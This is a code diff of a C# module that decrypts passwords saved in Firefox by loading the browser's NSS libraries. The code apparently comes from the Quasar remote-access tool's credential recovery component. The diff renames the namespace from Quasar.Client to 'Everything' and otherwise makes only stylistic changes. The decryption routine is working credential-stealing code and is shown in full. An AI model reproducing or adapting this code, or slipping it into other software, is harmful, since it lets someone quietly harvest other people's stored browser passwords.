@@ -4,7 +4,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Everything.Recovery.Browsers
 {
     /// <summary>
     /// Provides methods to decrypt Firefox credentials.
@@ -31,7 +31,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         public long Init(string configDirectory)
         {
-            string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
+            var mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
             Mozglue = ClientNatives.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
             NSS3 = ClientNatives.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
             NSS_Init = ClientNatives.Lookup<NssInit>("nss3.dll", "NSS_Init");
@@ -42,18 +42,18 @@ namespace Quasar.Client.Recovery.Browsers
 
         public string Decrypt(string cypherText)
         {
-            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
-            StringBuilder sb = new StringBuilder(cypherText);
+            var ffDataUnmanagedPointer = IntPtr.Zero;
+            var sb = new StringBuilder(cypherText);
 
             try
             {
-                byte[] ffData = Convert.FromBase64String(cypherText);
+                var ffData = Convert.FromBase64String(cypherText);
 
                 ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                 Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);
 
-                TSECItem tSecDec = new TSECItem();
-                TSECItem item = new TSECItem();
+                var tSecDec = new TSECItem();
+                var item = new TSECItem();
                 item.SECItemType = 0;
                 item.SECItemData = ffDataUnmanagedPointer;
                 item.SECItemLen = ffData.Length;
@@ -62,7 +62,7 @@ namespace Quasar.Client.Recovery.Browsers
                 {
                     if (tSecDec.SECItemLen != 0)
                     {
-                        byte[] bvRet = new byte[tSecDec.SECItemLen];
+                        var bvRet = new byte[tSecDec.SECItemLen];
                         Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                         return Encoding.ASCII.GetString(bvRet);
                     }
@@ -75,9 +75,7 @@ namespace Quasar.Client.Recovery.Browsers
             finally
             {
                 if (ffDataUnmanagedPointer != IntPtr.Zero)
-                {
                     Marshal.FreeHGlobal(ffDataUnmanagedPointer);
-                }
             }
 
             return null;
